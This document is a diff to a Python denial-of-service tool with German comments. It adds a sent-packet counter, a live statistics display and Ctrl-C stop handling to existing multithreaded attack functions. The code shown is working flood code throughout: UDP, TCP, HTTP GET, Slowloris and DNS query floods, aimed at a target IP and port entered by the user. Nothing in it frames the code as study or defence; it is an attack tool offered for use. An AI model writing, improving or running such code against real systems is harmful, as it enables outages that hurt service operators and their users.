@@ -3,6 +3,11 @@ import random
 import socket
 import requests
 import threading
+import time
+
+# Globale Variablen
+packet_counter = 0  # Zähler für gesendete Pakete
+stop_event = threading.Event()  # Ereignis zum Stoppen der Angriffe
 
 # Funktion zum Setzen der Farben
 def print_colored(text, color="pink", background="black"):
@@ -30,32 +35,45 @@ def thread_attack(func, *args):
     thread.daemon = True
     thread.start()
 
+# Funktion zum Anzeigen des Zählers
+def show_statistics():
+    while not stop_event.is_set():
+        print_colored(f"Gesendete Pakete: {packet_counter}", color="green", background="black")
+        time.sleep(1)  # Aktualisierung alle 1 Sekunde
+
 # Angriffsfunktionen
 def udp_flood(ip, port, packet_size):
+    global packet_counter
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     udp_bytes = random._urandom(packet_size)
-    while True:
+    while not stop_event.is_set():
         sock.sendto(udp_bytes, (ip, port))
+        packet_counter += 1
 
 def tcp_flood(ip, port, packet_size):
-    while True:
+    global packet_counter
+    while not stop_event.is_set():
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             sock.connect((ip, port))
             sock.send(random._urandom(packet_size))
+            packet_counter += 1
         except:
             pass
         finally:
             sock.close()
 
 def http_get_flood(target):
-    while True:
+    global packet_counter
+    while not stop_event.is_set():
         try:
             requests.get(target)
+            packet_counter += 1
         except:
             pass
 
 def slowloris(ip, port, num_threads):
+    global packet_counter
     sockets = []
     for _ in range(num_threads):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -66,19 +84,22 @@ def slowloris(ip, port, num_threads):
             sockets.append(sock)
         except:
             pass
-    while True:
+    while not stop_event.is_set():
         for sock in sockets:
             try:
                 sock.send(b"X-a: Keep-alive\r\n")
+                packet_counter += 1
             except:
                 pass
 
 def dns_flood(ip):
+    global packet_counter
     server = (ip, 53)
     query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
-    while True:
+    while not stop_event.is_set():
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(query, server)
+        packet_counter += 1
 
 # Hauptprogramm
 if __name__ == "__main__":
@@ -112,32 +133,42 @@ if __name__ == "__main__":
         port = int(input("Port (z. B. 80): "))
         packet_size = int(input("Paketgröße in Bytes (z. B. 1024): "))
 
+    # Zähler starten
+    stats_thread = threading.Thread(target=show_statistics)
+    stats_thread.daemon = True
+    stats_thread.start()
+
     # Angriffsstart
-    if method == "1":  # UDP Flood
-        print_colored("Starte UDP-Flood...", color=color, background=background)
-        for _ in range(num_threads):
-            thread_attack(udp_flood, ip, port, packet_size)
+    try:
+        if method == "1":  # UDP Flood
+            print_colored("Starte UDP-Flood...", color=color, background=background)
+            for _ in range(num_threads):
+                thread_attack(udp_flood, ip, port, packet_size)
 
-    elif method == "2":  # TCP Flood
-        print_colored("Starte TCP-Flood...", color=color, background=background)
-        for _ in range(num_threads):
-            thread_attack(tcp_flood, ip, port, packet_size)
+        elif method == "2":  # TCP Flood
+            print_colored("Starte TCP-Flood...", color=color, background=background)
+            for _ in range(num_threads):
+                thread_attack(tcp_flood, ip, port, packet_size)
 
-    elif method == "5":  # HTTP GET Flood
-        print_colored("Starte HTTP GET Flood...", color=color, background=background)
-        target_url = f"http://{ip}"
-        for _ in range(num_threads):
-            thread_attack(http_get_flood, target_url)
+        elif method == "5":  # HTTP GET Flood
+            print_colored("Starte HTTP GET Flood...", color=color, background=background)
+            target_url = f"http://{ip}"
+            for _ in range(num_threads):
+                thread_attack(http_get_flood, target_url)
 
-    elif method == "6":  # Slowloris
-        print_colored("Starte Slowloris...", color=color, background=background)
-        for _ in range(num_threads):
-            thread_attack(slowloris, ip, port, num_threads)
+        elif method == "6":  # Slowloris
+            print_colored("Starte Slowloris...", color=color, background=background)
+            for _ in range(num_threads):
+                thread_attack(slowloris, ip, port, num_threads)
 
-    elif method == "7":  # DNS Query Flood
-        print_colored("Starte DNS Query Flood...", color=color, background=background)
-        for _ in range(num_threads):
-            thread_attack(dns_flood, ip)
+        elif method == "7":  # DNS Query Flood
+            print_colored("Starte DNS Query Flood...", color=color, background=background)
+            for _ in range(num_threads):
+                thread_attack(dns_flood, ip)
 
-    else:
-        print_colored("Ungültige Auswahl. Das Programm wird beendet.", color="red", background="black")
+        else:
+            print_colored("Ungültige Auswahl. Das Programm wird beendet.", color="red", background="black")
+
+    except KeyboardInterrupt:
+        print_colored("\nAngriff gestoppt! Statistiken werden geschlossen.", color="yellow", background="black")
+        stop_event.set()
